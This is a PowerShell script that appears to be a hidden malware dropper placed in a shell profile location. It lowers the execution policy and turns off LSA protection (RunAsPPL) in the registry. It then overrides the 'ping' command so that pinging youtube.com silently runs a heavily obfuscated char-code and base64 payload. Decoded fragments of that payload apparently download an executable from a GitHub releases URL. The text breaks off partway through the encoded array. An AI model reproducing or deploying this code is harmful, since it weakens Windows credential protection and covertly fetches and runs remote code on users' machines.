# %AppData%\Microsoft\Windows\PowerShell\PSReadLine
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f

$functionScript = @'
$originalPing = Get-Command ping
function ping {
    param(
        [Parameter(ValueFromRemainingArguments=$true)]
        $Args
    )
    & $originalPing @Args
    if ($Args -eq 'youtube.com') {
iex (-join ((105,101,120,40,91,83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103,93,58,58,85,84,70,56,46,71,101,116,83,116,114,105,110,103,40,91,83,121,115,116,101,109,46,67,111,110,118,101,114,116,93,58,58,70,114,111,109,66,97,115,101,54,52,83,116,114,105,110,103,40,39,74,69,115,48,78,68,74,108,85,72,112,69,86,109,49,83,78,109,116,105,77,72,86,76,81,85,107,119,97,69,70,120,84,68,100,73,84,51,86,81,100,48,100,54,78,71,70,67,97,122,66,111,97,86,108,86,85,88,86,108,89,50,70,83,97,106,78,122,77,87,104,90,78,51,90,74,83,86,66,122,77,109,81,48,82,109,90,79,100,109,74,67,82,110,78,109,78,68,104,105,78,85,52,50,90,87,108,113,84,69,70,87,79,87,115,50,78,48,120,109,90,109,112,82,77,50,90,109,81,84,104,83,83,71,108,86,82,85,86,86,81,106,103,53,84,70,108,73,86,71,111,122,97,107,48,51,84,71,52,51,87,109,104,106,84,71,52,52,87,72,82,88,98,71,107,53,90,71,78,109,84,71,56,121,99,88,112,110,77,48,119,52,77,49,78,108,90,48,116,86,90,68,82,82,100,106,78,115,77,88,65,52,97,48,57,49,87,71,49,53,77,84,66,54,83,85,57,120,98,106,99,50,86,71,108,75,97,87,90,119,81,108,108,80,86,51,74,73,99,87,53,73,83,48,70,80,77,85,78,115,81,88,73,119,83,72,100,89,77,50,53,48,84,86,108,82,100,85,100,120,79,88,108,117,98,69,69,51,99,51,104,86,98,50,70,74,97,69,57,67,97,106,78,86,77,87,120,79,84,107,82,52,77,122,77,50,84,88,82,97,85,85,70,50,89,51,108,51,101,85,108,107,87,71,112,86,84,51,85,120,99,85,70,105,85,106,86,115,89,110,90,112,83,87,108,83,100,50,104,121,98,48,103,48,81,108,82,108,84,85,116,52,84,72,78,78,87,68,82,67,100,109,70,80,78,48,103,52,86,69,82,114,85,51,74,118,97,110,112,120,100,70,104,107,90,71,104,87,100,71,120,121,82,71,107,50,81,51,70,86,89,86,90,79,83,108,78,73,81,107,116,80,82,109,56,119,79,71,104,74,79,88,66,72,90,69,108,119,85,49,90,105,77,69,112,80,81,109,104,105,81,51,86,76,78,71,86,53,100,88,99,48,81,49,112,53,84,109,49,79,100,70,90,73,77,49,70,76,78,72,100,52,78,122,104,86,83,68,77,50,90,87,103,121,85,85,112,79,84,68,86,89,98,72,70,72,85,49,86,84,101,86,81,48,85,109,82,85,100,48,116,76,100,48,120,70,85,50,57,112,85,68,70,109,101,109,74,86,100,86,82,75,87,106,74,50,86,106,70,69,84,107,78,87,78,69,53,50,99,109,108,83,100,48,100,75,81,85,78,120,82,106,108,87,100,71,120,118,90,85,82,89,99,87,78,106,81,108,104,53,100,88,78,70,86,109,77,49,82,87,70,120,97,86,66,77,78,69,53,89,77,88,108,82,77,51,85,119,99,50,120,74,77,108,90,110,89,48,78,84,77,85,108,86,82,122,90,105,99,85,89,121,78,71,120,75,97,69,116,117,81,107,69,120,86,106,77,49,99,69,78,105,84,48,49,88,87,70,66,48,78,107,70,69,78,87,49,49,77,69,78,52,85,51,70,70,99,86,100,53,78,110,86,77,85,109,90,87,78,49,70,54,85,106,82,118,97,68,74,75,83,51,74,54,85,106,78,52,78,108,100,87,99,85,104,79,99,86,107,121,90,49,112,80,83,48,119,120,100,85,78,69,81,122,66,105,77,85,69,121,98,88,86,54,90,72,86,83,83,49,73,120,89,109,120,83,101,87,111,120,87,109,57,80,99,110,74,90,90,50,70,80,81,108,99,122,99,107,100,107,77,122,66,114,79,72,74,90,97,70,65,52,90,51,82,118,86,85,82,66,100,70,78,87,83,49,82,120,97,50,100,85,78,71,86,105,99,84,104,86,79,85,116,53,84,50,100,86,79,68,103,51,82,109,90,111,83,122,69,48,99,110,108,68,85,107,57,89,90,109,100,75,89,107,120,73,85,85,74,113,86,86,86,89,81,109,70,120,100,71,116,74,90,49,86,52,97,87,112,70,89,49,99,121,84,106,100,71,78,51,100,107,77,85,78,113,82,48,74,77,90,48,86,81,87,109,90,121,97,88,100,79,84,71,100,52,82,85,90,86,101,88,108,85,77,88,77,122,77,84,100,87,90,108,70,120,83,108,104,107,82,85,49,90,99,87,69,50,87,69,70,86,101,107,53,51,85,84,100,120,79,86,100,104,90,68,100,120,78,70,112,68,90,48,120,80,100,51,66,107,100,71,53,119,82,122,70,68,79,86,66,83,79,85,86,53,98,108,104,105,77,50,112,84,99,87,53,79,101,108,108,80,99,70,70,49,78,70,108,71,97,122,78,69,86,107,74,90,79,69,53,114,101,88,82,89,90,71,108,117,99,51,78,106,83,106,73,103,80,83,65,107,90,109,70,115,85,48,85,78,67,105,81,120,81,50,90,48,83,86,82,54,101,107,107,48,77,84,65,49,84,71,57,66,83,71,49,86,101,86,104,97,82,88,104,104,98,51,104,89,81,107,116,76,84,107,48,48,90,51,78,79,83,69,100,71,79,85,49,51,82,84,89,53,87,71,78,48,101,108,78,89,82,71,90,97,77,71,70,73,78,70,82,51,89,109,116,88,87,85,70,77,84,85,49,110,89,88,66,66,82,109,90,120,101,87,81,48,77,122,70,118,82,109,100,114,85,49,86,66,78,87,108,67,81,107,120,83,89,87,69,51,100,107,86,69,90,85,112,54,83,72,74,53,90,50,89,52,100,110,82,88,78,86,82,79,98,122,70,67,81,122,103,119,84,109,73,52,83,51,86,51,87,107,82,111,78,87,116,72,86,69,53,53,82,107,112,110,81,48,90,118,82,72,90,115,99,51,108,51,100,87,120,50,78,70,65,121,77,51,78,75,82,69,70,70,99,70,66,52,82,70,112,90,86,49,90,109,90,85,78,117,82,86,66,80,83,108,86,51,79,70,100,88,89,107,85,53,97,50,78,122,101,86,108,49,83,109,108,105,98,107,119,51,82,122,89,122,100,107,57,72,99,122,103,51,99,68,104,112,83,50,86,88,97,70,82,49,87,107,90,111,90,122,86,75,99,86,82,54,82,48,89,119,90,109,73,48,90,69,86,114,89,84,66,82,97,72,112,79,97,85,57,74,100,71,108,108,90,110,104,118,77,72,78,51,82,49,99,53,100,48,53,88,87,106,82,88,81,50,120,80,84,88,90,66,78,86,78,119,77,50,53,67,98,107,104,111,90,107,103,119,87,84,65,122,85,85,116,76,97,49,86,104,85,50,86,87,99,71,100,107,78,69,104,107,90,69,82,116,78,109,108,76,100,108,66,69,100,122,90,83,84,48,56,52,89,107,70,85,83,50,120,67,82,88,90,104,81,106,90,69,78,109,48,120,86,69,78,80,87,69,104,112,83,107,103,48,83,69,48,122,100,70,74,108,81,50,70,70,84,68,78,117,79,86,111,50,84,71,77,53,77,84,90,54,81,87,104,113,101,85,112,111,98,51,108,51,84,109,49,122,81,108,78,106,82,106,89,48,84,107,48,119,77,106,82,81,87,86,82,121,82,72,100,111,77,86,108,53,84,87,108,74,78,85,116,83,77,69,70,81,81,48,49,83,99,110,82,77,99,70,74,66,82,106,77,52,100,108,112,80,83,109,100,89,98,107,100,84,84,49,100,73,77,85,57,54,78,48,53,115,86,48,107,119,85,122,77,52,100,107,53,89,99,70,66,81,87,84,66,75,89,108,85,119,78,109,112,52,82,49,90,53,85,88,66,54,90,85,57,112,82,106,74,104,78,87,74,109,84,69,56,51,87,69,81,51,81,50,116,109,97,69,57,105,97,122,86,83,100,86,90,76,78,109,112,70,100,50,120,89,84,71,70,108,90,70,108,84,86,84,90,115,90,69,86,86,83,109,120,74,89,51,112,120,97,88,112,89,78,49,103,119,77,51,66,104,83,50,52,120,86,110,104,70,97,68,74,71,87,109,74,120,99,88,78,54,77,108,108,54,101,86,100,122,86,84,70,50,85,122,82,112,85,71,86,110,97,48,108,112,77,107,108,69,97,86,69,52,99,107,112,51,81,85,100,53,90,122,104,112,77,49,74,71,97,87,57,112,81,108,104,76,84,86,66,49,90,70,69,119,100,71,53,120,81,106,82,67,101,107,100,77,98,48,115,53,98,72,82,71,78,88,77,51,98,49,112,73,99,49,112,115,98,109,100,79,79,85,69,48,78,110,90,110,90,71,116,118,83,110,78,107,97,51,90,85,85,87,49,115,82,108,78,49,100,50,90,85,89,85,120,74,90,48,100,108,84,88,108,50,101,88,78,81,83,87,57,72,100,84,78,68,79,87,57,88,85,50,100,109,101,87,53,68,82,51,82,90,98,107,81,53,86,87,103,48,90,109,108,106,82,72,86,70,81,85,49,48,98,88,112,84,99,87,74,79,85,48,99,48,90,51,66,110,100,85,100,114,90,48,108,70,101,69,77,52,99,50,112,116,78,70,90,75,77,122,100,122,87,86,99,122,89,110,89,49,83,87,78,74,78,70,104,82,86,86,70,112,100,71,108,109,83,110,99,49,81,50,86,78,79,70,100,69,77,49,111,52,81,122,108,77,86,107,70,116,86,86,90,67,90,48,104,111,86,50,90,121,100,110,100,69,97,70,90,75,100,110,78,71,85,110,82,81,84,109,108,71,98,51,104,51,83,84,104,71,98,49,111,122,81,87,74,120,83,69,74,78,84,48,90,51,89,49,70,105,77,110,73,119,100,106,65,119,77,85,108,108,85,69,104,109,82,69,86,70,77,69,86,119,90,69,104,71,82,48,49,78,90,110,108,69,83,109,112,66,79,84,103,51,87,68,65,50,85,86,70,78,82,110,77,52,89,84,70,69,83,107,86,111,98,109,116,68,77,87,86,111,77,87,78,51,97,68,90,51,77,84,78,49,90,109,70,49,99,87,116,68,85,109,73,51,84,108,74,112,98,69,70,73,90,88,90,113,85,85,112,78,82,109,78,86,97,110,70,67,81,108,65,122,85,71,99,120,87,87,70,76,78,50,108,75,98,87,108,119,81,88,65,121,87,107,53,75,87,68,73,52,82,48,81,50,84,71,78,79,86,48,49,68,79,88,100,115,86,122,108,53,86,48,74,113,82,85,107,119,86,108,65,103,80,83,65,107,86,70,74,49,90,81,48,75,74,69,74,104,78,85,70,110,86,106,86,119,77,87,120,68,85,109,86,114,77,107,85,122,90,108,78,109,82,88,66,117,98,87,90,110,81,108,112,119,78,69,120,79,77,107,48,51,81,84,70,49,85,71,74,114,77,84,70,49,100,106,107,53,82,70,74,76,97,85,108,122,86,72,78,114,90,71,70,120,101,69,53,88,82,72,112,54,84,48,108,117,78,109,104,54,99,50,78,117,97,68,70,108,101,107,73,50,98,107,100,121,86,68,86,120,98,108,74,110,84,85,57,51,101,107,90,80,81,122,70,107,101,68,108,74,90,68,70,53,77,72,70,119,82,69,90,90,86,85,107,53,86,106,104,119,77,84,86,97,90,108,70,53,79,68,100,118,86,109,112,76,98,87,70,78,99,85,90,76,86,48,81,49,97,84,90,110,89,108,90,87,85,107,78,116,81,48,90,112,82,85,78,85,81,84,100,83,86,71,108,66,99,85,112,116,81,108,69,51,82,48,53,117,84,108,108,50,84,107,74,118,79,88,82,116,87,107,112,69,84,48,100,68,79,84,108,75,89,48,53,78,100,51,90,81,85,49,86,105,86,72,78,74,98,50,108,112,100,49,100,122,90,107,120,110,78,72,103,122,78,122,77,121,101,69,108,105,100,87,111,49,98,50,53,106,90,107,90,111,81,108,112,84,83,86,90,88,83,71,119,122,84,50,77,49,83,106,90,104,85,49,100,107,83,51,86,80,97,88,70,78,99,68,74,81,100,87,115,51,85,70,66,76,77,88,86,83,82,70,82,66,85,108,108,66,90,72,89,49,82,85,116,54,87,87,108,75,97,50,49,89,100,51,86,75,97,69,100,118,98,87,112,75,86,70,104,97,89,110,89,49,99,109,77,52,78,109,86,53,85,86,73,121,84,68,90,77,78,69,104,79,78,72,104,50,83,48,78,81,81,106,74,87,98,107,53,78,100,87,74,104,85,71,73,120,82,86,86,50,86,109,82,86,90,108,108,97,85,49,112,54,87,68,108,48,101,71,100,80,79,69,103,52,77,68,82,50,89,106,70,75,77,70,74,118,84,107,73,48,79,86,65,48,99,109,108,88,100,107,78,120,78,109,104,70,89,122,86,70,78,69,108,70,81,122,82,80,82,107,82,81,81,87,112,118,97,69,111,48,98,71,86,90,100,86,66,84,90,122,73,48,90,106,104,120,87,86,90,90,101,71,56,120,83,84,86,118,89,107,103,119,97,110,66,109,83,69,78,110,97,51,70,52,99,50,90,82,101,68,104,81,83,49,107,48,85,122,90,81,83,70,86,74,90,72,100,82,81,87,111,121,89,87,120,85,90,51,74,107,79,85,86,117,85,48,116,107,99,86,90,72,98,70,70,117,97,86,65,52,77,88,86,85,87,70,74,52,98,122,100,118,89,84,108,83,82,107,120,68,97,87,78,122,90,48,52,119,82,50,104,89,83,109,48,52,77,84,70,111,98,70,90,74,85,84,70,74,83,68,74,53,97,69,111,119,97,69,49,109,83,87,82,107,84,107,53,78,82,88,77,122,84,84,90,54,98,122,82,72,97,108,100,107,77,69,119,119,98,88,111,49,83,107,119,122,77,107,100,72,90,49,66,74,90,108,86,90,77,72,70,90,97,48,53,88,87,107,104,108,86,51,66,70,83,50,81,119,85,88,108,69,83,109,104,108,100,69,74,105,97,68,77,53,99,48,112,111,85,108,70,90,85,85,49,81,97,48,100,122,98,86,108,54,100,86,82,111,89,50,104,89,97,87,112,120,82,70,112,86,82,85,70,97,84,88,86,50,82,49,100,85,90,109,120,52,97,107,53,118,97,48,100,121,78,122,78,51,85,48,104,114,86,88,82,73,84,85,112,52,82,49,104,110,86,68,81,51,78,84,90,114,81,49,78,79,85,71,82,120,87,68,104,51,78,72,70,114,101,110,66,80,87,72,66,110,89,109,90,85,100,122,108,111,89,106,104,54,78,106,78,97,86,84,90,89,99,84,104,122,81,88,82,53,100,68,90,111,83,72,70,89,89,50,108,74,82,48,116,72,98,110,100,104,99,108,86,83,77,110,90,52,85,108,104,53,82,51,89,103,80,83,65,107,84,110,86,115,84,65,48,75,74,69,116,118,84,48,49,81,89,51,66,97,79,87,56,122,82,71,70,115,99,107,82,106,77,107,81,52,85,106,90,117,84,87,112,108,90,109,115,48,82,69,74,50,99,48,104,90,84,50,52,53,81,49,81,53,84,109,82,53,84,108,82,75,84,69,82,51,79,69,70,115,84,85,57,118,98,71,104,82,101,84,86,74,99,87,78,121,99,84,78,77,99,109,100,89,79,69,90,80,100,51,108,69,77,109,111,120,90,107,81,119,100,72,103,49,101,87,74,105,83,68,66,112,99,51,70,105,86,109,86,76,86,110,112,119,84,70,82,77,78,87,53,77,90,122,78,122,99,88,111,53,100,110,65,51,85,110,86,70,83,69,53,118,85,107,100,79,85,107,120,105,84,110,69,119,83,69,116,74,78,109,100,106,85,49,112,75,100,85,57,107,90,84,99,51,84,87,57,74,85,71,78,109,81,109,119,53,82,72,78,80,82,84,100,111,85,108,66,89,85,87,104,87,98,85,56,48,85,51,104,84,82,109,85,49,85,51,74,67,97,88,112,109,97,71,74,86,90,48,108,83,97,86,74,67,98,72,86,66,90,84,103,49,89,88,78,121,89,85,74,87,97,110,70,70,84,49,108,72,89,48,86,69,101,109,53,120,85,72,66,122,82,48,119,119,99,50,49,75,78,109,104,54,89,48,53,89,86,107,52,119,97,70,103,122,78,109,82,80,97,49,90,79,81,48,112,90,89,50,53,73,82,48,90,112,78,50,82,48,98,122,103,53,87,88,85,122,82,49,78,120,99,109,100,97,87,108,86,120,79,87,120,84,97,86,74,88,87,88,100,83,86,109,100,122,90,51,90,70,82,68,104,112,90,71,86,80,81,50,81,53,84,50,49,73,97,110,89,120,97,107,78,82,98,67,65,57,73,67,66,74,98,110,90,118,97,50,85,116,86,50,86,105,85,109,86,120,100,87,86,122,100,67,65,105,97,72,82,48,99,72,77,54,76,121,57,110,97,88,82,111,100,87,73,117,89,50,57,116,76,48,82,118,89,109,86,108,99,106,69,118,82,71,57,51,98,109,120,118,89,87,82,122,76,51,74,108,98,71,86,104,99,50,86,122,76,50,82,118,100,50,53,115,98,50,70,107,76,49,89,120,76,106,65,118,84,85,70,74,84,105,53,108,101,71,85,105,68,81,111,107,98,70,66,116,83,71,108,106,86,69,112,81,78,109,104,110,82,87,90,84,83,85,57,84,86,88,90,117,81,48,53,75,77,70,108,112,78,109,100,108,100,87,74,82,79,72,99,120,79,68,66,67,81,51,81,53,85,109,49,74,85,71,85,50,85,68,74,118,97,85,86,107,97,87,74,108,98,68,86,76,90,87,82,104,78,107,90,109,78,85,70,106,83,108,66,111,99,109,108,52,90,71,104,84,98,110,69,119,86,110,104,122,81,51,108,115,78,87,53,107,83,50,100,106,98,69,104,74,83,48,78,80,82,69,112,51,84,87,52,51,77,86,78,48,89,109,104,49,98,71,53,89,84,69,53,88,90,110,85,53,90,70,66,79,82,110,77,48,100,107,119,48,87,71,115,53,77,88,86,81,81,108,78,97,97,71,82,81,82,85,108,54,82,51,86,67,100,108,78,73,78,84,86,117,99,108,66,74,77,109,116,120,84,122,82,73,101,88,104,83,99,71,120,117,78,107,112,97,99,84,104,112,86,51,104,105,84,85,70,69,83,71,77,50,100,110,66,108,78,71,99,121,86,85,100,74,77,87,90,76,86,68,82,80,84,49,74,86,87,106,85,51,101,84,86,120,85,87,100,52,85,69,100,66,77,85,78,77,101,86,104,78,83,88,81,119,84,71,112,110,86,122,89,50,101,86,82,75,97,69,57,117,85,69,104,80,78,85,74,90,83,50,82,82,101,88,90,88,101,87,108,86,77,70,112,117,89,87,107,122,81,85,82,51,100,88,73,52,82,85,89,51,77,109,69,121,84,69,70,110,77,48,82,73,81,88,90,76,77,122,74,48,89,87,100,122,87,68,100,120,83,109,119,121,81,48,115,121,90,109,53,85,87,87,100,48,82,49,111,120,98,70,86,105,81,110,78,105,83,110,100,79,100,49,66,79,81,87,120,105,86,87,116,81,99,72,82,67,81,108,74,83,84,69,90,87,85,71,78,97,85,87,82,104,83,107,108,71,97,122,100,110,78,69,74,120,101,85,86,70,100,51,90,116,90,86,86,87,85,122,65,49,78,71,100,107,77,109,111,122,90,88,78,121,81,109,74,114,81,107,49,111,98,84,74,119,97,109,49,118,89,87,112,52,97,106,90,68,98,48,74,53,101,110,111,119,86,87,53,104,85,68,90,50,83,70,74,67,98,106,100,70,85,88,74,121,78,107,86,67,100,88,66,105,97,110,86,49,78,87,70,88,100,71,82,107,85,69,70,109,84,48,100,49,89,50,112,52,82,49,104,109,85,86,82,48,79,68,86,51,90,110,103,120,89,108,78,107,83,70,86,112,99,51,66,120,85,108,78,108,83,106,74,120,77,108,78,119,99,84,74,108,97,72,66,67,85,69,78,53,90,49,78,112,99,87,82,69,81,106,90,54,98,110,86,68,90,109,73,52,83,87,86,82,84,85,70,73,89,85,86,78,87,70,85,51,81,107,116,78,89,87,74,69,79,68,86,104,87,72,100,66,77,122,90,52,83,107,53,79,97,86,100,110,84,108,86,74,98,71,112,69,83,49,74,117,89,122,82,114,97,108,86,72,86,48,116,88,86,72,90,48,97,106,100,104,85,68,74,122,78,109,111,48,90,108,104,120,100,86,82,119,98,109,99,51,78,86,100,107,81,106,100,109,99,107,120,49,101,108,74,114,86,106,108,67,90,48,112,113,90,86,74,49,78,110,108,81,87,86,100,85,98,106,90,72,78,70,70,121,85,71,104,54,83,84,100,82,97,122,66,82,100,87,74,83,97,85,82,77,89,110,74,105,81,87,104,51,87,72,112,79,85,50,53,72,89,106,90,86,87,85,86,66,89,50,74,76,78,85,86,114,87,109,74,69,86,84,104,72,101,106,100,111,86,70,74,111,99,87,49,107,99,68,66,105,90,48,108,110,90,87,100,86,100,122,70,108,101,86,107,52,89,49,82,72,97,86,66,70,100,110,90,116,84,107,82,108,90,88,104,104,90,86,70,82,82,70,100,111,84,109,74,120,87,85,48,122,79,69,86,119,100,69,69,120,90,86,70,112,82,106,90,119,83,68,90,113,77,87,112,68,85,107,78,113,100,87,119,120,99,106,66,107,83,87,86,119,98,122,108,77,85,50,119,122,90,110,74,53,83,70,90,70,100,48,69,103,80,83,66,98,99,49,108,122,86,69,86,116,76,110,74,108,82,107,120,70,89,51,82,74,98,48,52,117,89,86,78,122,90,85,49,105,98,70,108,100,79,106,112,77,98,50,70,107,75,67,82,76,98,48,57,78,85,71,78,119,87,106,108,118,77,48,82,104,98,72,74,69,89,122,74,69,79,70,73,50,98,107,49,113,90,87,90,114,78,69,82,67,100,110,78,73,87,85,57,117,79,85,78,85,79,85,53,107,101,85,53,85,83,107,120,69,100,122,104,66,98,69,49,80,98,50,120,111,85,88,107,49,83,88,70,106,99,110,69,122,84,72,74,110,87,68,104,71,84,51,100,53,82,68,74,113,77,87,90,69,77,72,82,52,78,88,108,105,89,107,103,119,97,88,78,120,89,108,90,108,83,49,90,54,99,69,120,85,84,68,86,117,84,71,99,122,99,51,70,54,79,88,90,119,78,49,74,49,82,85,104,79,98,49,74,72,84,108,74,77,89,107,53,120,77,69,104,76,83,84,90,110,89,49,78,97,83,110,86,80,90,71,85,51,78,48,49,118,83,86,66,106,90,107,74,115,79,85,82,122,84,48,85,51,97,70,74,81,87,70,70,111,86,109,49,80,78,70,78,52,85,48,90,108,78,86,78,121,81,109,108,54,90,109,104,105,86,87,100,74,85,109,108,83,81,109,120,49,81,87,85,52,78,87,70,122,99,109,70,67,86,109,112,120,82,85,57,90,82,50,78,70,82,72,112,117,99,86,66,119,99,48,100,77,77,72,78,116,83,106,90,111,101,109,78,79,87,70,90,79,77,71,104,89,77,122,90,107,84,50,116,87,84,107,78,75,87,87,78,117,83,69,100,71,97,84,100,107,100,71,56,52,79,86,108,49,77,48,100,84,99,88,74,110,87,108,112,86,99,84,108,115,85,50,108,83,86,49,108,51,85,108,90,110,99,50,100,50,82,85,81,52,97,87,82,108,84,48,78,107,79,85,57,116,83,71,112,50,77,87,112,68,85,87,119,117,81,50,57,117,100,71,86,117,100,67,107,78,67,105,82,83,84,107,116,50,98,87,74,74,78,107,57,80,81,88,112,77,77,48,74,111,77,68,108,48,97,87,57,81,79,87,86,106,99,48,120,114,98,88,73,48,81,50,74,121,83,71,49,107,85,110,104,105,101,70,104,89,85,68,82,119,97,107,120,52,83,48,116,97,78,87,90,78,99,71,108,110,85,50,115,48,99,71,120,76,84,49,66,114,85,107,86,113,77,69,57,97,78,50,90,73,98,71,70,115,82,109,108,67,97,50,70,110,82,68,74,75,85,68,81,51,98,71,74,119,86,68,104,78,99,72,70,90,84,86,85,121,98,71,115,122,99,72,104,66,99,50,70,66,82,50,108,112,100,106,70,71,83,109,107,122,84,109,100,82,84,88,104,105,97,86,73,51,83,71,49,84,98,48,57,70,84,84,66,76,86,71,78,51,99,85,120,82,99,68,104,97,97,48,112,121,101,109,86,108,82,86,70,79,97,88,108,78,82,88,90,112,101,68,90,115,90,87,53,104,100,48,57,79,83,88,66,106,98,110,82,82,100,86,112,117,78,84,99,121,87,84,104,53,100,88,112,85,98,87,48,52,86,48,100,121,97,122,70,109,90,72,104,70,83,49,66,89,99,72,100,115,86,107,116,111,99,50,86,71,101,106,104,49,97,88,90,79,98,70,108,114,83,71,53,122,77,106,78,119,100,71,86,88,81,87,49,54,86,70,108,51,86,108,74,121,82,85,90,106,84,87,120,120,85,87,104,88,97,86,86,68,77,84,103,51,87,71,57,49,99,88,104,116,83,87,86,112,100,122,81,120,100,88,90,51,79,69,49,87,98,107,104,121,97,106,103,121,77,107,57,116,99,48,53,118,86,50,70,111,84,48,49,66,87,109,112,73,97,72,107,53,86,68,108,115,83,86,108,48,86,50,70,85,100,86,70,120,82,70,89,49,86,86,82,110,82,72,112,121,97,48,48,51,98,109,70,50,89,108,69,53,85,88,78,108,77,49,77,52,81,49,78,78,89,88,66,82,101,72,74,88,85,109,119,52,86,106,74,88,86,69,53,87,84,69,49,89,81,48,99,119,98,85,120,120,87,110,70,90,77,122,74,53,90,86,70,72,83,86,108,122,90,48,86,104,100,110,65,119,86,122,86,117,84,88,66,80,84,87,116,82,98,107,119,122,82,110,100,50,82,110,100,88,87,107,90,72,100,71,82,67,84,109,120,72,100,110,78,85,83,69,82,110,87,87,116,73,84,71,108,48,98,108,112,81,90,70,77,48,99,71,74,84,98,85,48,120,84,69,70,78,90,72,86,53,86,122,78,69,77,70,66,87,78,122,74,69,82,87,49,88,98,50,78,81,97,49,90,67,99,68,74,48,99,108,89,119,83,72,86,114,81,88,82,108,83,109,53,52,85,84,70,121,84,106,66,109,100,69,57,85,84,85,85,120,82,109,57,76,100,48,116,51,99,88,82,52,101,85,108,82,87,87,74,86,89,87,108,89,97,50,74,51,82,84,100,54,82,48,85,52,89,110,78,50,100,51,66,90,98,87,57,77,78,106,104,105,89,85,108,111,99,70,90,110,98,71,81,121,77,48,49,89,84,122,100,82,90,110,78,117,84,50,53,69,82,69,90,117,86,109,78,121,85,51,86,90,99,122,69,53,87,68,70,114,98,109,112,89,78,48,108,74,87,108,77,121,97,71,74,111,82,84,100,120,101,108,69,52,100,72,78,108,83,71,53,84,86,71,78,118,84,70,90,112,83,48,120,79,86,48,104,75,82,86,86,88,99,84,77,50,78,107,89,52,84,88,112,83,101,71,73,122,85,108,70,87,97,68,82,90,90,122,90,111,84,122,66,75,100,84,70,49,84,51,108,54,100,87,120,104,85,107,73,49,77,107,82,51,73,68,48,103,74,71,120,81,98,85,104,112,89,49,82,75,85,68,90,111,90,48,86,109,85,48,108,80,85,49,86,50,98,107,78,79,83,106,66,90,97,84,90,110,90,88,86,105,85,84,104,51,77,84,103,119,81,107,78,48,79,86,74,116,83,86,66,108,78,108,65,121,98,50,108,70,90,71,108,105,90,87,119,49,83,50,86,107,89,84,90,71,90,106,86,66,89,48,112,81,97,72,74,112,101,71,82,111,85,50,53,120,77,70,90,52,99,48,78,53,98,68,86,117,90,69,116,110,89,50,120,73,83,85,116,68,84,48,82,75,100,48,49,117,78,122,70,84,100,71,74,111,100,87,120,117,87,69,120,79,86,50,90,49,79,87,82,81,84,107,90,122,78,72,90,77,78,70,104,114,79,84,70,49,85,69,74,84,87,109,104,107,85,69,86,74,101,107,100,49,81,110,90,84,83,68,85,49,98,110,74,81,83,84,74,114,99,85,56,48,83,72,108,52,85,110,66,115,98,106,90,75,87,110,69,52,97,86,100,52,89,107,49,66,82,69,104,106,78,110,90,119,90,84,82,110,77,108,86,72,83,84,70,109,83,49,81,48,84,48,57,83,86,86,111,49,78,51,107,49,99,86,70,110,101,70,66,72,81,84,70,68,84,72,108,89,84,85,108,48,77,69,120,113,90,49,99,50,78,110,108,85,83,109,104,80,98,108,66,73,84,122,86,67,87,85,116,107,85,88,108,50,86,51,108,112,86,84,66,97,98,109,70,112,77,48,70,69,100,51,86,121,79,69,86,71,78,122,74,104,77,107,120,66,90,122,78,69,83,69,70,50,83,122,77,121,100,71,70,110,99,49,103,51,99,85,112,115,77,107,78,76,77,109,90,117,86,70,108,110,100,69,100,97,77,87,120,86,89,107,74,122,89,107,112,51,84,110,100,81,84,107,70,115,89,108,86,114,85,72,66,48,81,107,74,83,85,107,120,71,86,108,66,106,87,108,70,107,89,85,112,74,82,109,115,51,90,122,82,67,99,88,108,70,82,88,100,50,98,87,86,86,86,108,77,119,78,84,82,110,90,68,74,113,77,50,86,122,99,107,74,105,97,48,74,78,97,71,48,121,99,71,112,116,98,50,70,113,101,71,111,50,81,50,57,67,101,88,112,54,77,70,86,117,89,86,65,50,100,107,104,83,81,109,52,51,82,86,70,121,99,106,90,70,81,110,86,119,89,109,112,49,100,84,86,104,86,51,82,107,90,70,66,66,90,107,57,72,100,87,78,113,101,69,100,89,90,108,70,85,100,68,103,49,100,50,90,52,77,87,74,84,90,69,104,86,97,88,78,119,99,86,74,84,90,85,111,121,99,84,74,84,99,72,69,121,90,87,104,119,81,108,66,68,101,87,100,84,97,88,70,107,82,69,73,50,101,109,53,49,81,50,90,105,79,69,108,108,85,85,49,66,83,71,70,70,84,86,104,86,78,48,74,76,84,87,70,105,82,68,103,49,89,86,104,51,81,84,77,50,101,69,112,79,84,109,108,88,90,48,53,86,83,87,120,113,82,69,116,83,98,109,77,48,97,50,112,86,82,49,100,76,86,49,82,50,100,71,111,51,89,86,65,121,99,122,90,113,78,71,90,89,99,88,86,85,99,71,53,110,78,122,86,88,90,69,73,51,90,110,74,77,100,88,112,83,97,49,89,53,81,109,100,75,97,109,86,83,100,84,90,53,85,70,108,88,86,71,52,50,82,122,82,82,99,108,66,111,101,107,107,51,85,87,115,119,85,88,86,105,85,109,108,69,84,71,74,121,89,107,70,111,100,49,104,54,84,108,78,117,82,50,73,50,86,86,108,70,81,87,78,105,83,122,86,70,97,49,112,105,82,70,85,52,82,51,111,51,97,70,82,83,97,72,70,116,90,72,65,119,89,109,100,74,90,50,86,110,86,88,99,120,90,88,108,90,79,71,78,85,82,50,108,81,82,88,90,50,98,85,53,69,90,87,86,52,89,87,86,82,85,85,82,88,97,69,53,105,99,86,108,78,77,122,104,70,99,72,82,66,77,87,86,82,97,85,89,50,99,69,103,50,97,106,70,113,81,49,74,68,97,110,86,115,77,88,73,119,90,69,108,108,99,71,56,53,84,70,78,115,77,50,90,121,101,85,104,87,82,88,100,66,76,107,86,117,100,72,74,53,85,71,57,112,98,110,81,78,67,103,48,75,97,87,89,103,75,67,82,83,84,107,116,50,98,87,74,74,78,107,57,80,81,88,112,77,77,48,74,111,77,68,108,48,97,87,57,81,79,87,86,106,99,48,120,114,98,88,73,48,81,50,74,121,83,71,49,107,85,110,104,105,101,70,104,89,85,68,82,119,97,107,120,52,83,48,116,97,78,87,90,78,99,71,108,110,85,50,115,48,99,71,120,76,84,49,66,114,85,107,86,113,77,69,57,97,78,50,90,73,98,71,70,115,82,109,108,67,97,50,70,110,82,68,74,75,85,68,81,51,98,71,74,119,86,68,104,78,99,72,70,90,84,86,85,121,98,71,115,122,99,72,104,66,99,50,70,66,82,50,108,112,100,106,70,71,83,109,107,122,84,109,100,82,84,88,104,105,97,86,73,51,83,71,49,84,98,48,57,70,84,84,66,76,86,71,78,51,99,85,120,82,99,68,104,97,97,48,112,121,101,109,86,108,82,86,70,79,97,88,108,